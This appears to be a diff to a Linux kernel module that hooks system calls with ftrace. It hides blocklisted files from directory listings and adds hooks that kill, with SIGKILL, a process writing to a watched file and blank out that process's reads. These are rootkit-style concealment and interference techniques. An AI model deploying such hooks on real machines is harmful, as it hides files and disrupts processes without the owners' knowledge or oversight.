@@ -77,6 +77,7 @@ static unsigned long lookup_name(const char *name)
 
     if (register_kprobe(&kp) < 0) 
     {
+        DMSG("register_kprobe failed for %s", name);
         return 0;
     }
     retval = (unsigned long) kp.addr;
@@ -143,6 +144,29 @@ static char *get_filename(const char __user *filename)
     return kernel_filename;
 }
 
+static asmlinkage long (*real_sys_read)(struct pt_regs *regs);
+
+static asmlinkage long fh_sys_read(struct pt_regs *regs)
+{
+    long ret = 0;
+    struct task_struct *task;
+    task = current;
+
+    if (task->pid == target_pid)
+    {
+        DMSG("fh_sys_read called with target_pid: %d", target_pid);
+        // if (regs->si == target_fd)
+        // {
+        //     DMSG("read done for target_fd %d", target_fd);
+            return 0;
+        // }
+        // DMSG("real_sys_read called by process %d", task->pid);
+    }
+    ret = real_sys_read(regs);
+
+    return ret;
+}
+
 
 static asmlinkage long (*real_sys_write)(struct pt_regs *regs);
 
@@ -150,17 +174,32 @@ static asmlinkage long fh_sys_write(struct pt_regs *regs)
 {
     long ret = 0;
     struct task_struct *task;
+    int signum = 0;
+    struct kernel_siginfo info;
 
+    signum = SIGKILL;
     task = current;
 
     if (task->pid == target_pid)
     {
-        DMSG("write fh_sys_write with %d", regs->di);
+        DMSG("fh_sys_write called with target_pid %d", target_pid);
         if (regs->di == target_fd)
         {
-            DMSG("write done by process %d to target file.", task->pid);
-            return 0;
+            DMSG("write done for target_fd %d", target_fd);
+            memset(&info, 0, sizeof(struct kernel_siginfo));
+            info.si_signo = signum;
+            ret = send_sig_info(signum, &info, task);
+            if (ret < 0)
+            {
+                DMSG(KERN_INFO "error sending signal");
+            }
+            else 
+            {
+                DMSG(KERN_INFO "Target has been killed");
+                return 0;
+            }
         }
+        DMSG("real_sys_write called by process %d", task->pid);
     }
     ret = real_sys_write(regs);
 
@@ -172,29 +211,28 @@ static asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
 
 static asmlinkage long fh_sys_openat(struct pt_regs *regs)
 {
-    long ret;
-    char *kernel_filename;
-    struct task_struct *task;
-    task = current;
-    kernel_filename = get_filename((void*) regs->si);
+	long ret;
+	char *kernel_filename;
+	struct task_struct *task;
+	task = current;
+	kernel_filename = get_filename((void*) regs->si);
 
-    if (check_fs_blocklist(kernel_filename))
-    {
-        DMSG("our file is opened by process with id: %d\n", task->pid);
-        DMSG("opened file : %s\n", kernel_filename);
-        kfree(kernel_filename);
-        ret = real_sys_openat(regs);
-        DMSG("fd returned is %ld\n", ret);
-        target_fd = ret;
-        target_pid = task->pid;
-        return 0;
+	if (check_fs_blocklist(kernel_filename))
+	{
+		DMSG("our file is opened by process with id: %d", task->pid);
+		DMSG("opened file : %s", kernel_filename);
+		kfree(kernel_filename);
+		ret = real_sys_openat(regs);
+		DMSG("fd returned is %ld", ret);
+		target_fd = ret;
+		target_pid = task->pid;
+		return ret;
+	}
 
-    }
+	kfree(kernel_filename);
+	ret = real_sys_openat(regs);
 
-    kfree(kernel_filename);
-    ret = real_sys_openat(regs);
-
-    return ret;
+	return ret;
 }
 
 
@@ -253,7 +291,7 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
 
         if (check_fs_hidelist(current_dir->d_name))
         {
-            if (current_dir == dirent_ker )
+            if (current_dir == dirent_ker)
             {
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
@@ -291,6 +329,7 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
 
 static struct ftrace_hook demo_hooks[] = {
     HOOK("sys_write", fh_sys_write, &real_sys_write),
+    HOOK("sys_read", fh_sys_read, &real_sys_read),
     HOOK("sys_openat", fh_sys_openat, &real_sys_openat),
     HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
     HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
